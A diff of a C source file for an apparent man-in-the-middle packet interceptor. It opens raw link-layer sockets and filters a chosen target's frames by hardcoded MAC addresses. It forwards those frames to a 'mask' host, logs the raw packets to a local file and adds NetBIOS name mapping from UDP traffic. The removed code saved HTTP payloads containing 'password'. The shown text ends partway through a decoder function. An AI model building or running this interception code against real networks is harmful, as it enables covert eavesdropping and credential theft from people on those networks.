@@ -7,6 +7,7 @@
 #include <arpa/inet.h>
 #include <net/if.h> // for ifreq
 #include <sys/ioctl.h> //ioctl
+#include <time.h>
 
 //ARP file
 #define ARP_TABEL  "/proc/net/arp"
@@ -29,6 +30,31 @@ typedef struct {
                        unsigned char src_addr[6];
                        unsigned int type : 16;
 } __attribute__((packed)) EtherNetFram;
+
+//ARP Header // 28 Byte
+typedef struct {
+      unsigned char HTYPE[2]; //Hardware type
+      unsigned char PTYPE[2]; //Protocol type
+      unsigned char HLEN[1];  //Hardware len
+      unsigned char PLEN[1];  //Protocol len
+      unsigned char OPER[2];  //Opration
+      
+      unsigned char SHA_2[2]; //Sender hardware Addr *first 2 byte
+      unsigned char SHA_4[2]; // nxt 2 byte
+      unsigned char SHA_6[2]; // last 2 byte
+      
+      unsigned char SPA_2[2]; //Sender Protocol Addr *first 2 byte
+      unsigned char SPA_4[2]; // last 2 byte
+
+      unsigned char THA_2[2]; //Target Hardware Addr *first 2 byte
+      unsigned char THA_4[2];
+      unsigned char THA_6[2]; 
+
+      unsigned char TPA_2[2]; //Target Protocol Addr *first 2 byte
+      unsigned char TPA_4[2];
+
+}__attribute((packed)) ARP_Packet;
+
 
 //IP Header 20 byte
 typedef struct {
@@ -61,37 +87,37 @@ typedef struct {
 
 }__attribute((packed)) TCP_packet;
 
-//ARP Header // 28 Byte
+// UDP Header 8 byte
 typedef struct {
-      unsigned char HTYPE[2]; //Hardware type
-      unsigned char PTYPE[2]; //Protocol type
-      unsigned char HLEN[1];  //Hardware len
-      unsigned char PLEN[1];  //Protocol len
-      unsigned char OPER[2];  //Opration
-      
-      unsigned char SHA_2[2]; //Sender hardware Addr *first 2 byte
-      unsigned char SHA_4[2]; // nxt 2 byte
-      unsigned char SHA_6[2]; // last 2 byte
-      
-      unsigned char SPA_2[2]; //Sender Protocol Addr *first 2 byte
-      unsigned char SPA_4[2]; // last 2 byte
+  unsigned char src_port[2];
+  unsigned char dst_port[2];
+  unsigned char len[2];
+  unsigned char chk_sum[2];
+}__attribute((packed)) UDP_packet;
 
-      unsigned char THA_2[2]; //Target Hardware Addr *first 2 byte
-      unsigned char THA_4[2];
-      unsigned char THA_6[2]; 
-
-      unsigned char TPA_2[2]; //Target Protocol Addr *first 2 byte
-      unsigned char TPA_4[2];
-
-}__attribute((packed)) ARP_Packet;
+// NetBIOS (UDP) Header 82 byte
+typedef struct{
+  unsigned int  msg_type     : 8; 
+  unsigned int  flags        : 8;
+  unsigned int  dataGram_id  : 16;
+  unsigned char src_ip[4];
+  unsigned int  src_port     : 16;
+  unsigned int  dataGram_len : 16;
+  unsigned int  data_offset  : 16;
+  unsigned char src_name[34];
+  unsigned char dst_name[34]; 
+}__attribute((packed)) NetBIOS_packet;
 
 //Globel Var
+int func = 0; //use to pick program functionality.
 int forwardSock;
 int receiverSock;
 int DataSize;
 int run = 1;
 int counter = 0;
 char devider[] = "\n ********************************************************************";
+//forward Data status
+int Sendstatus;
 
 int interface_index = 2;
 unsigned char own_mac_Add[6] = {0x9c,0x5c,0x8e,0x8e,0x6e,0xbe}; //middel man
@@ -105,121 +131,164 @@ unsigned char mask_bin[4]; // ip in binary format
 unsigned char mask_mac[6]   = {0xd0,0x17,0xc2,0x9c,0x42,0x28};
 
 
+//Structures
 EtherNetFram eth;
 IPv4Header ipv4Header;
 TCP_packet tcp;
+UDP_packet udp;
+NetBIOS_packet netBios;
 ARP_Packet arp_packet;
-LL_SockAddr ll_sock_disc,ll_sock_disc_rec; ;
+LL_SockAddr ll_sock_disc,ll_sock_disc_rec; 
 
 
 //Function dec
-void getInterface();
-void forward(unsigned char *buf); 
-void setUpForwarding();
-void setUpReceveing();
-int  isFromTarget();
-void writeToFile(unsigned char *data,int DataSize);
-void getTargetInfo(unsigned char *target, unsigned char *target_mac);
-int  find(char *buffer, char *pattern, int len);
+void getInterface ();
+
+void decodeEther (unsigned char *buff, EtherNetFram *eth, int debug);
+void decodeARP (unsigned char *buff, ARP_Packet *arp);
+void decodeIPv4 (unsigned char *buff, IPv4Header *ipv4, int debug);
+void decodeTCP (unsigned char *buff, TCP_packet *tcp, int debug);
+void decodeHttp (unsigned char *buff, int debug);
+void decodeUDP (unsigned char *buff, UDP_packet *udp, int debug);
+void decodeNetBIOS (unsigned char *buff, NetBIOS_packet *netBios, int debug, int log);
+unsigned char * decodeNetBIOS_Name (unsigned char * encoded_name);
+
+void forward (unsigned char *buff, int debug); 
+void setUpForwarding ();
+void setUpReceveing ();
+int  isFromTarget ();
+void writeToFile (unsigned char *data,int DataSize);
+void getTargetInfo (unsigned char *target, unsigned char *target_mac);
+int  find (char *buffer, char *pattern, int len);
 
 
- //DeCode EtherNet
- void decodeEther(unsigned char *buf, EtherNetFram *eth, int debug ){
-    if(debug){
-       printf("\n dst => %02X:%02X:%02X:%02X:%02X:%02X",buf[0],buf[1],buf[2],buf[3],buf[4],buf[5]);
-       printf("\n src => %02X:%02X:%02X:%02X:%02X:%02X",buf[6],buf[7],buf[8],buf[9],buf[10],buf[11]);
-       printf("\n type => %02X:%02X",buf[12],buf[13]);
-      }
-       memcpy(eth,buf,14);
- }
 
- //Decode ARP
-void decodeARP(unsigned char *buf, ARP_Packet *arp){
- memcpy(arp, &buf[14], 28);
+
+void main(){
+  
+  int MAXMSG = 65536;
+  struct sockaddr addr;
+  unsigned char buf[MAXMSG];
+  
+  //Get Interface detail
+  getInterface();
+  
+  //Select functonality
+  printf("\n Selecte func .\n  1 for NetBios Mapping\n  2 for Http capture.\n");
+  scanf("%d",&func);
+  
+  if(func == 2){ // Http intercepting 
+    //GEt Target ip and Mask mac
+    struct sockaddr_in saddr_ip;
+
+    printf("\nTarget src =>");
+    scanf("%s",target);
+    inet_pton(AF_INET, target, &saddr_ip.sin_addr);
+    memcpy(target_bin, &saddr_ip.sin_addr, 4);
+    printf("\nTarget src binary to string ipv4 =>%d.%d.%d.%d",(int)target_bin[0],(int)target_bin[1],(int)target_bin[2],(int)target_bin[3]); //debug
+    
+    getTargetInfo(target,target_mac);
+    
+    printf("\n\n Mask addr =>");
+    scanf("%s",mask);
+    inet_pton(AF_INET, mask, &saddr_ip.sin_addr);
+    memcpy(mask_bin, &saddr_ip.sin_addr, 4);
+    printf("\nTarget dst binary to string ipv4 =>%d.%d.%d.%d",(int)mask_bin[0],(int)mask_bin[1],(int)mask_bin[2],(int)mask_bin[3]); //debug
+    
+    getTargetInfo(mask,mask_mac);
+    // exit(0);
+    //Create and bind sock for forwarding
+    setUpForwarding();
+  }
+
  
- printf("\n dst => %02X:%02X:%02X:%02X:%02X:%02X",buf[0],buf[1],buf[2],buf[3],buf[4],buf[5]);
- printf("\n src => %02X:%02X:%02X:%02X:%02X:%02X",buf[6],buf[7],buf[8],buf[9],buf[10],buf[11]);
- printf("\n src raw :%s",eth.src_addr);
- printf("\n type => %02X:%02X",buf[12],buf[13]);
-
- printf("\n Htype %02X,%02X",arp_packet.HTYPE[0],arp_packet.HTYPE[1]);
- printf("\n Ptype :%02x:%02x",arp_packet.PTYPE[0],arp_packet.PTYPE[1]);
- printf("\n OPER  :%02X,%02X",arp_packet.OPER[0],arp_packet.OPER[1]);
- printf("\n HLEN :%02X",arp_packet.HLEN[0]); 
- printf("\n PLEN :%02X",arp_packet.PLEN[0]);
-
- if(arp_packet.OPER[1] == 0x01){
-   printf("  Request");
- }
- else{
-   printf("  Replay");
- }
-
- printf("\n SHA => %02X:%02X:%02X:%02X:%02X:%02X",arp_packet.SHA_2[0],arp_packet.SHA_2[1], arp_packet.SHA_4[0],arp_packet.SHA_4[1], arp_packet.SHA_6[0],arp_packet.SHA_6[1]);
- printf("  SPA => %d.%d.%d.%d",(int)arp_packet.SPA_2[0],(int)arp_packet.SPA_2[1], (int)arp_packet.SPA_4[0],(int)arp_packet.SPA_4[1]);
- printf("\n THA => %02X:%02X:%02X:%02X:%02X:%02X",arp_packet.THA_2[0],arp_packet.THA_2[1], arp_packet.THA_4[0],arp_packet.THA_4[1], arp_packet.THA_6[0],arp_packet.THA_6[1]);
- printf("  TPA => %d.%d.%d.%d \n\n",(int)arp_packet.TPA_2[0],(int)arp_packet.TPA_2[1], (int)arp_packet.TPA_4[0],(int)arp_packet.TPA_4[1]);
-}
-
-// DeCode IPv4 Header
-void decodeIPv4(unsigned char *buf, IPv4Header *ipv4){
-    memcpy(ipv4, &buf[14], 20);
-
-    printf("\n protocal :%02X",ipv4->protocal);
-    printf("\n header len :%d",ipv4->hl);
-    printf("\n payload len :%d",htons(ipv4->tol));
-    printf("\n frag flags :%03X",ipv4->flags);  
-    // printf("\n Type of Service :%02X\n",ipv);   
-    printf("\n src Addresss Decoded :%d.%d.%d.%d",(int)ipv4->src_addr[0], (int)ipv4->src_addr[1], (int)ipv4->src_addr[2], (int)ipv4->src_addr[3]);
-    printf("\n Dst Addresss Decoded :%d.%d.%d.%d",(int)ipv4->dst_addr[0], (int)ipv4->dst_addr[1], (int)ipv4->dst_addr[2], (int)ipv4->dst_addr[3]);
-}  
-
-//Decode TCP PAcket
-void decodeTCP(unsigned char *buf, TCP_packet *tcp){
-  memcpy(tcp,&buf[34],22);
-  // printf("\n source port :%d",htons(tcp->src_port));
-  // printf("\n destination port :%d",htons(tcp->dst_port));
-  // printf("\n data offset :%02X",tcp->offset);
-  // printf("\n window :%02X",tcp->window);
   
-  int dataStart = (tcp->offset) * 4;
-  // printf("\n data start :%d",dataStart);
-  
-   // 65 Header Size
-  //  printf("\n payload size :%d",DataSize);
-   if( (int)htons(tcp->dst_port) == 80 || (int)htons(tcp->src_port) == 80 ){
-    // printf("\n HTTP data.."); 
-    int header = 65 + dataStart;
-    if(DataSize - header > 0){
-        unsigned char data [DataSize-header];
-        // printf("\n Header Size :%d",header);
-        // printf("\n data size :%lu",sizeof(data));
-        memcpy(data,&buf[header], DataSize-header);
+  setUpReceveing();
+  int debug = 0;
+  int size =  sizeof addr;
+  int data;
+  while(run){
+      printf("\n start at : %lu\n", (unsigned long)time(NULL)); 
+      DataSize = data = recvfrom(receiverSock, buf, sizeof(buf), 0,NULL,NULL);
+      if(data < 0){
+        printf("\nCan not get any packets, status :%d",data);
+      }
+      else{
+        //printf("\r.........Intercept Some data size..%d",data);
+        if(func == 2){ //func for http intercept
+          //Filter
+          if( buf[11] != target_mac[5] && buf[10] != target_mac[4]   ||   buf[5] == mask_mac[5] && buf[4] == mask_mac[4]){
+              printf("\r Packet droped %d byte ",DataSize);   
+              if(debug){
+                printf("\n dst => %02X:%02X:%02X:%02X:%02X:%02X",buf[0],buf[1],buf[2],buf[3],buf[4],buf[5]);
+                printf("\n src => %02X:%02X:%02X:%02X:%02X:%02X",buf[6],buf[7],buf[8],buf[9],buf[10],buf[11]);
+                printf("\n type => %02X:%02X",buf[12],buf[13]);
 
-        printf("\n HTTP.. Payload ...");
-        // printf("\n src Addresss Decoded :%d.%d.%d.%d",(int)ipv4Header.src_addr[0], (int)ipv4Header.src_addr[1], (int)ipv4Header.src_addr[2], (int)ipv4Header.src_addr[3]);
-        // printf("\n Dst Addresss Decoded :%d.%d.%d.%d",(int)ipv4Header.dst_addr[0], (int)ipv4Header.dst_addr[1], (int)ipv4Header.dst_addr[2], (int)ipv4Header.dst_addr[3]);
-        
-        // //chk is trafic from target then forward
-        //int st = isFromTarget();
-
-        if(isFromTarget()){
-          printf("\n Is from target");
-          //Forward the tarfic 
-           memcpy(buf, &mask_mac, 6); // dst mac to mask mac 
-          //  memcpy(&buf[6], &targetMac, 6); // change src mac back to target
-           forward(buf);
-          //  exit(0);
+                printf("\n src Addresss Decoded :%d.%d.%d.%d",(int)buf[26], (int)buf[27], (int)buf[28], (int)buf[29]);
+                printf("\n Dst Addresss Decoded :%d.%d.%d.%d",(int)buf[30], (int)buf[31], (int)buf[32], (int)buf[33]);
+              }
+            continue;
+          }
         }
-        
-        if(strstr(data, "password"))
-          writeToFile(data,sizeof(data));
 
-        // if(sizeof(data) == 1)
-          // writeToFile(data,sizeof(data));  
-    }
-   }
+         // EtherNetFram eth;
+        decodeEther(buf,&eth,0);
+
+        switch(htons(eth.type)){
+          
+          case 0x0800:
+            // printf("\r\a It's IPv4 Packet."); 
+            // IPv4Header ipv4Header;
+            decodeIPv4(buf,&ipv4Header,0);
+            // continue;
+            if(ipv4Header.protocal == 0x06){ // its TCP
+              // printf("\n\n It's TCP Packet."); 
+              // TCP_packet tcp;
+              decodeTCP(buf,&tcp,0);
+              // switch(tcp.src_port){
+              //    case 137:
+              //     printf("\n SMB over TCP");
+              //     break;
+              //    case 139:
+              //     printf("\n SMB over TCP");
+              //     break;
+              //    default:
+              //    break;  
+
+              // }
+            }
+            else if(ipv4Header.protocal == 0x11){ // UDP Header
+              // printf("\n\n It's UDP Packet."); 
+              if(func!=1)
+               continue;
+              decodeUDP(buf,&udp,0);
+              // printf("\n UDP port :%02X,%02X",udp.src_port[0],udp.src_port[1]);
+              // 0x14e9 (5353) mDns service port 
+              if(udp.src_port[0] == 0x14 && udp.src_port[1] == 0xe9){
+               printf("\n m DNS Service.");
+              }
+              if(udp.src_port[0] == 0x00 && udp.src_port[1] == 0x8A){
+                 printf("\n m SMG over udp.");
+                  decodeNetBIOS(buf,&netBios,0,1);
+              }
+            }
+          break;
+          
+          case 0x0806:
+              // printf("\n It's ARP Packet.\n"); 
+              // decodeARP( buf, &arp_packet);
+          break;
+
+          case 0x86DD:
+              // printf("\n It's IPv6 Packet.\n"); 
+          break;
+        }
+      }
+      
+    }//While 
+  // }
 }
+
 
 //Get interface index & info
 void getInterface(){
@@ -269,143 +338,6 @@ void getInterface(){
     
 }
 
-void writeToFile(unsigned char *data, int len){ 
- FILE *logFile = fopen("/home/satyaprakash/Algo/log1.txt","ab");
-      if(logFile == NULL){
-        printf("Failed to open file ..\n");
-      }
-      else{
-         printf("\n writing to File data:%d",len);
-         fwrite(devider,1,len,logFile); //Devider
-         //Src Dst mac
-        //  memcpy(mac,eth.src_addr,6);
-         
-        //  fprintf(logFile,"%s",eth.src_addr);
-        //  fprintf(logFile,"%s","\n");
-        //  fprintf(logFile,"%s",ipv4Header.src_addr);
-        //  fprintf(logFile,"%s","\n\n");
-        //  fprintf(logFile,"%s",eth.dst_addr); 
-        //  fprintf(logFile,"%s","\n");
-        //  fprintf(logFile,"%s",ipv4Header.dst_addr); 
-        //  fprintf(logFile,"%s","\n\n");
-        
-         fwrite(data,1,len,logFile); 
-         fclose(logFile);
-         exit(0);
-      }
-   
-  //  if(len > 10 )//&& counter > 50)
-  //     run = 0; 
-
-    // counter++;    
-} 
-
-int isFromTarget(){
-  // printf("\n checking target ip");
-  
-  if(target_bin[3] ==  (int)ipv4Header.src_addr[3])
-      return 1;
-  else
-    return 0;
-}
-
-// Receiving socket
-void setUpReceveing(){
- receiverSock = socket(AF_PACKET, SOCK_RAW, htons(0x0003)); 
-    if(receiverSock > 0){
-      
-      printf("\n Receiver socket is created ....");
-
-      // initialize link layer sock discriptor 
-      ll_sock_disc_rec.sll_family   = AF_PACKET; // AF_PACKET *default
-      ll_sock_disc_rec.sll_protocol = htons(0x0003); // Not required  0 for nothing
-      ll_sock_disc_rec.sll_ifindex  = interface_index;
-      ll_sock_disc_rec.sll_hatype   = 0; // Not required  0 for nothing
-      ll_sock_disc_rec.sll_pkttype  = '0'; // Not required  0 for nothing
-      ll_sock_disc_rec.sll_halen    = '6';
-      memcpy(ll_sock_disc_rec.sll_addr, &target_mac, 6);
-      
-
-       //debug ll sock
-       printf("\n\n family :%d",ll_sock_disc_rec.sll_family);
-       printf("\n protocol :%d",ll_sock_disc_rec.sll_protocol);
-       printf("\n if index :%d",ll_sock_disc_rec.sll_ifindex);
-       printf("\n hatype :%d",ll_sock_disc_rec.sll_hatype);
-       printf("\n pkt type :%c",ll_sock_disc_rec.sll_pkttype);
-       printf("\n ha-len :%02x",ll_sock_disc_rec.sll_halen);
-       printf("\n addre :=> %02x:%02x:%02x:%02x:%02x:%02x",ll_sock_disc_rec.sll_addr[0], ll_sock_disc_rec.sll_addr[1], ll_sock_disc_rec.sll_addr[2], ll_sock_disc_rec.sll_addr[3], ll_sock_disc_rec.sll_addr[4], ll_sock_disc_rec.sll_addr[5]);
-       
-       printf("\n receiver LL Sock discriptor size :%d",(int) sizeof(ll_sock_disc_rec));
-
-      
-        //Bind
-         int bindStatus = bind(receiverSock, (struct sockaddr *)&ll_sock_disc_rec, sizeof (ll_sock_disc_rec) );
-         printf("\n\n receiver bind status :%d, errorCode :%d",bindStatus,errno); 
-         if(bindStatus == -1)
-           exit(0);
-    }
-    else{
-      printf("\n receiver sock creation failed :%d",errno);
-      exit(0);
-    }
-
-} 
-
-// Sending socket
-void setUpForwarding(){
-    forwardSock = socket(AF_PACKET, SOCK_RAW, htons(0x0003));
-    if(forwardSock > 0){
-       printf("\n Forward socket is created ....");
-
-      // initialize link layer sock discriptor 
-      ll_sock_disc.sll_family   = AF_PACKET; // AF_PACKET *default
-      ll_sock_disc.sll_protocol = htons(0x0003); // Not required  0 for nothing
-      ll_sock_disc.sll_ifindex  = interface_index;
-      ll_sock_disc.sll_hatype   = 0; // Not required  0 for nothing
-      ll_sock_disc.sll_pkttype  = '0'; // Not required  0 for nothing
-      ll_sock_disc.sll_halen    = '6';
-      memcpy(ll_sock_disc.sll_addr, &mask_mac, 6);
-      
-
-       //debug ll sock
-       printf("\n\n family :%d",ll_sock_disc.sll_family);
-       printf("\n protocol :%d",ll_sock_disc.sll_protocol);
-       printf("\n if index :%d",ll_sock_disc.sll_ifindex);
-       printf("\n hatype :%d",ll_sock_disc.sll_hatype);
-       printf("\n pkt type :%c",ll_sock_disc.sll_pkttype);
-       printf("\n ha-len :%02x",ll_sock_disc.sll_halen);
-       printf("\n addre :=> %02x:%02x:%02x:%02x:%02x:%02x",ll_sock_disc.sll_addr[0], ll_sock_disc.sll_addr[1], ll_sock_disc.sll_addr[2], ll_sock_disc.sll_addr[3], ll_sock_disc.sll_addr[4], ll_sock_disc.sll_addr[5]);
-       
-       printf("\n LL Sock discriptor size :%d",(int) sizeof(ll_sock_disc));
-
-      
-        //Bind
-         int bindStatus = bind(forwardSock, (struct sockaddr *)&ll_sock_disc, sizeof (ll_sock_disc) );
-         printf("\n\n forward sock bind status :%d, errorCode :%d",bindStatus,errno); 
-         if(bindStatus == -1)
-           exit(0);
-    }
-    else{
-      printf("\n forawrd sock creation failed :%d",errno);
-      exit(0);
-    }
-
-}
-
-//forward Data
-int Sendstatus;
-void forward(unsigned char *buf){
-  // printf("\n Forwarding Data...");
-  Sendstatus = send(forwardSock, buf, DataSize, MSG_DONTWAIT);
-  if(Sendstatus < 0){
-    printf("\n forwarding failed ..%d",errno);
-  }
-  // else{
-  //   printf("\n forwarded data ..%d",Sendstatus);
-  // }
-}
-
-
 //GEt Target info from arp tabel
 void getTargetInfo(unsigned char * target, unsigned char *targetMac){
     //find in arp tabel
@@ -452,110 +384,412 @@ void getTargetInfo(unsigned char * target, unsigned char *targetMac){
     }
 }
 
+// Receiving socket
+void setUpReceveing(){
+ receiverSock = socket(AF_PACKET, SOCK_RAW, htons(0x0003)); 
+    if(receiverSock > 0){
+      
+      printf("\n Receiver socket is created ....");
+
+      // initialize link layer sock discriptor 
+      ll_sock_disc_rec.sll_family   = AF_PACKET; // AF_PACKET *default
+      ll_sock_disc_rec.sll_protocol = htons(0x0003); // Not required  0 for nothing
+      ll_sock_disc_rec.sll_ifindex  = interface_index;
+      ll_sock_disc_rec.sll_hatype   = 0; // Not required  0 for nothing
+      ll_sock_disc_rec.sll_pkttype  = '0'; // Not required  0 for nothing
+      ll_sock_disc_rec.sll_halen    = '6';
+      memcpy(ll_sock_disc_rec.sll_addr, &target_mac, 6);
+      
+
+       //debug ll sock
+       printf("\n\n family :%d",ll_sock_disc_rec.sll_family);
+       printf("\n protocol :%d",ll_sock_disc_rec.sll_protocol);
+       printf("\n if index :%d",ll_sock_disc_rec.sll_ifindex);
+       printf("\n hatype :%d",ll_sock_disc_rec.sll_hatype);
+       printf("\n pkt type :%c",ll_sock_disc_rec.sll_pkttype);
+       printf("\n ha-len :%02x",ll_sock_disc_rec.sll_halen);
+       printf("\n addre :=> %02x:%02x:%02x:%02x:%02x:%02x",ll_sock_disc_rec.sll_addr[0], ll_sock_disc_rec.sll_addr[1], ll_sock_disc_rec.sll_addr[2], ll_sock_disc_rec.sll_addr[3], ll_sock_disc_rec.sll_addr[4], ll_sock_disc_rec.sll_addr[5]);
+       
+       printf("\n receiver LL Sock discriptor size :%d",(int) sizeof(ll_sock_disc_rec));
+
+      
+        //Bind
+         int bindStatus = bind(receiverSock, (struct sockaddr *)&ll_sock_disc_rec, sizeof (ll_sock_disc_rec) );
+         printf("\n\n receiver bind status :%d, errorCode :%d",bindStatus,errno); 
+         if(bindStatus == -1)
+           exit(0);
+    }
+    else{
+      printf("\n receiver sock creation failed :%d",errno);
+      exit(0);
+    }
+
+} 
+
+// Sending socket
+void setUpForwarding(){
+
+    forwardSock = socket(AF_PACKET, SOCK_RAW, htons(0x0003));
+    if(forwardSock > 0){
+       printf("\n Forward socket is created ....");
+
+      // initialize link layer sock discriptor 
+      ll_sock_disc.sll_family   = AF_PACKET; // AF_PACKET *default
+      ll_sock_disc.sll_protocol = htons(0x0003); // Not required  0 for nothing
+      ll_sock_disc.sll_ifindex  = interface_index;
+      ll_sock_disc.sll_hatype   = 0; // Not required  0 for nothing
+      ll_sock_disc.sll_pkttype  = '0'; // Not required  0 for nothing
+      ll_sock_disc.sll_halen    = '6';
+      memcpy(ll_sock_disc.sll_addr, &mask_mac, 6);
+      
+
+       //debug ll sock
+       printf("\n\n family :%d",ll_sock_disc.sll_family);
+       printf("\n protocol :%d",ll_sock_disc.sll_protocol);
+       printf("\n if index :%d",ll_sock_disc.sll_ifindex);
+       printf("\n hatype :%d",ll_sock_disc.sll_hatype);
+       printf("\n pkt type :%c",ll_sock_disc.sll_pkttype);
+       printf("\n ha-len :%02x",ll_sock_disc.sll_halen);
+       printf("\n addre :=> %02x:%02x:%02x:%02x:%02x:%02x",ll_sock_disc.sll_addr[0], ll_sock_disc.sll_addr[1], ll_sock_disc.sll_addr[2], ll_sock_disc.sll_addr[3], ll_sock_disc.sll_addr[4], ll_sock_disc.sll_addr[5]);
+       
+       printf("\n LL Sock discriptor size :%d",(int) sizeof(ll_sock_disc));
+
+      
+        //Bind
+         int bindStatus = bind(forwardSock, (struct sockaddr *)&ll_sock_disc, sizeof (ll_sock_disc) );
+         printf("\n\n forward sock bind status :%d, errorCode :%d",bindStatus,errno); 
+         if(bindStatus == -1)
+           exit(0);
+    }
+    else{
+      printf("\n forawrd sock creation failed :%d",errno);
+      exit(0);
+    }
+
+}
+
+// Forward packet to mask
+void forward(unsigned char *buf,int debug){
+  printf("\n Forwarding Data...%d",DataSize);
+  Sendstatus = send(forwardSock, buf, DataSize, 0);
+  printf("\n Data Forward status... %d",Sendstatus);
+  
+  if(debug){
+       printf("\n dst => %02X:%02X:%02X:%02X:%02X:%02X",buf[0],buf[1],buf[2],buf[3],buf[4],buf[5]);
+       printf("\n src => %02X:%02X:%02X:%02X:%02X:%02X",buf[6],buf[7],buf[8],buf[9],buf[10],buf[11]);
+       printf("\n type => %02X:%02X",buf[12],buf[13]);
+
+       printf("\n src Addresss Decoded :%d.%d.%d.%d",(int)buf[26], (int)buf[27], (int)buf[28], (int)buf[29]);
+       printf("\n Dst Addresss Decoded :%d.%d.%d.%d",(int)buf[30], (int)buf[31], (int)buf[32], (int)buf[33]);
+  }
+  writeToFile(buf,DataSize);
+  printf("\n Forwrding Done...... %d \n",Sendstatus);
+  printf("\n forwding End : %lu\n", (unsigned long)time(NULL));
+  // if(Sendstatus < 0){
+  //   printf("\n forwarding failed ..%d",errno);
+  // }
+  // else{
+  //   printf("\n forwarded data ..%d",Sendstatus);
+  // }
+}
+
 //Patern Match
-int find(char *buffer, char *pattern, int len){
-  //here 0x20 is 'space' charecter in assci
-   for(int i=0; i<len; i++){
+int find(char *buffer, char *pattern, int pattern_len){
+   //here 0x20 is 'space' charecter in assci
+   for(int i=0; i<pattern_len; i++){
       // printf("\n matcheing => %02x == %02x",buffer[i],pattern[i]); //Debug
-      if(pattern[i] != 0x00 && buffer[i] != 0x20){
-       if(buffer[i] != pattern[i])
+      if(pattern[i] != 0x00){
+        if (buffer[i] != 0x20){
+          if(buffer[i] != pattern[i])
+            return 0;
+        }
+        else
           return 0;
       }
-         
-   }
+      else if(buffer[i] != 0x20)
+       return 0;
+      
+    } 
   //  exit(0);
-   return 1;
+   return 1;  
+} 
+
+//Chk if packet from target
+int isFromTarget(){
+  // printf("\n checking target ip");
+  
+  if(target_bin[3] ==  (int)ipv4Header.src_addr[3])
+      return 1;
+  else
+    return 0;
+}
+
+void writeToFile(unsigned char *data, int len){ 
+ FILE *logFile = fopen("/home/satyaprakash/Algo/logSendRaw.txt","ab");
+      if(logFile == NULL){
+        printf("Failed to open file ..\n");
+      }
+      else{
+         printf("\n writing to File data %d",len);
+         fwrite(devider,1,71,logFile); //Devider         
+         fwrite(data,1,len,logFile); 
+         fclose(logFile);
+        //  exit(0);
+      }
 } 
 
 
+//**********************Decoders************************//
 
-void main(){
-  int MAXMSG = 65536;
-  int socket_desc;
-  struct sockaddr addr;
-  unsigned char buf[MAXMSG];
-  
-  //Get Interface detail
-  getInterface();
+//DeCode EtherNet
+void decodeEther(unsigned char *buf, EtherNetFram *eth, int debug ){
+    if(debug){
+       printf("\n dst => %02X:%02X:%02X:%02X:%02X:%02X",buf[0],buf[1],buf[2],buf[3],buf[4],buf[5]);
+       printf("\n src => %02X:%02X:%02X:%02X:%02X:%02X",buf[6],buf[7],buf[8],buf[9],buf[10],buf[11]);
+       printf("\n type => %02X:%02X",buf[12],buf[13]);
+      }
+       memcpy(eth,buf,14);
+}
 
-  //GEt Target ip and Mask mac
-  struct sockaddr_in saddr_ip;
+//Decode ARP
+void decodeARP(unsigned char *buf, ARP_Packet *arp){
+  memcpy(arp, &buf[14], 28);
+  
+  printf("\n dst => %02X:%02X:%02X:%02X:%02X:%02X",buf[0],buf[1],buf[2],buf[3],buf[4],buf[5]);
+  printf("\n src => %02X:%02X:%02X:%02X:%02X:%02X",buf[6],buf[7],buf[8],buf[9],buf[10],buf[11]);
+  printf("\n src raw :%s",eth.src_addr);
+  printf("\n type => %02X:%02X",buf[12],buf[13]);
 
-  printf("\nTarget src =>");
-  scanf("%s",target);
-  inet_pton(AF_INET, target, &saddr_ip.sin_addr);
-  memcpy(target_bin, &saddr_ip.sin_addr, 4);
-  printf("\nTarget src binary to string ipv4 =>%d.%d.%d.%d",(int)target_bin[0],(int)target_bin[1],(int)target_bin[2],(int)target_bin[3]); //debug
+  printf("\n Htype %02X,%02X",arp_packet.HTYPE[0],arp_packet.HTYPE[1]);
+  printf("\n Ptype :%02x:%02x",arp_packet.PTYPE[0],arp_packet.PTYPE[1]);
+  printf("\n OPER  :%02X,%02X",arp_packet.OPER[0],arp_packet.OPER[1]);
+  printf("\n HLEN :%02X",arp_packet.HLEN[0]); 
+  printf("\n PLEN :%02X",arp_packet.PLEN[0]);
+
+  if(arp_packet.OPER[1] == 0x01){
+    printf("  Request");
+  }
+  else{
+    printf("  Replay");
+  }
+
+  printf("\n SHA => %02X:%02X:%02X:%02X:%02X:%02X",arp_packet.SHA_2[0],arp_packet.SHA_2[1], arp_packet.SHA_4[0],arp_packet.SHA_4[1], arp_packet.SHA_6[0],arp_packet.SHA_6[1]);
+  printf("  SPA => %d.%d.%d.%d",(int)arp_packet.SPA_2[0],(int)arp_packet.SPA_2[1], (int)arp_packet.SPA_4[0],(int)arp_packet.SPA_4[1]);
+  printf("\n THA => %02X:%02X:%02X:%02X:%02X:%02X",arp_packet.THA_2[0],arp_packet.THA_2[1], arp_packet.THA_4[0],arp_packet.THA_4[1], arp_packet.THA_6[0],arp_packet.THA_6[1]);
+  printf("  TPA => %d.%d.%d.%d \n\n",(int)arp_packet.TPA_2[0],(int)arp_packet.TPA_2[1], (int)arp_packet.TPA_4[0],(int)arp_packet.TPA_4[1]);
+}
+
+// DeCode IPv4 Header
+void decodeIPv4(unsigned char *buf, IPv4Header *ipv4, int debug){
+   memcpy(ipv4, &buf[14], 20);
+   if(debug){
+    printf("\n protocal :%02X",ipv4->protocal);
+    printf("\n header len :%d",ipv4->hl);
+    printf("\n payload len :%d",htons(ipv4->tol));
+    printf("\n frag flags :%03X",ipv4->flags);  
+    // printf("\n Type of Service :%02X\n",ipv);   
+    // printf("\n src Addresss Decoded :%d.%d.%d.%d",(int)ipv4->src_addr[0], (int)ipv4->src_addr[1], (int)ipv4->src_addr[2], (int)ipv4->src_addr[3]);
+    // printf("\n Dst Addresss Decoded :%d.%d.%d.%d",(int)ipv4->dst_addr[0], (int)ipv4->dst_addr[1], (int)ipv4->dst_addr[2], (int)ipv4->dst_addr[3]);
+   }
+}  
+
+//Decode TCP PAcket
+void decodeTCP(unsigned char *buf, TCP_packet *tcp, int debug){
+  memcpy(tcp,&buf[34],22);
+ 
+  if(debug){
+    printf("\n source port :%d",htons(tcp->src_port));
+    printf("\n destination port :%d",htons(tcp->dst_port));
+    printf("\n data offset :%02X",tcp->offset);
+    printf("\n window :%02X",tcp->window);
+    int dataStart = (tcp->offset) * 4;
+    printf("\n data start :%d",dataStart);
+  }
+
+  int dataStart = (tcp->offset) * 4;
+  if(debug)
+    printf("\n data start :%d",dataStart);
+
+  if(func == 2){
+     decodeHttp(buf,0);  
   
-  getTargetInfo(target,target_mac);
-  
-  printf("\n\n Mask addr =>");
-  scanf("%s",mask);
-  inet_pton(AF_INET, mask, &saddr_ip.sin_addr);
-  memcpy(mask_bin, &saddr_ip.sin_addr, 4);
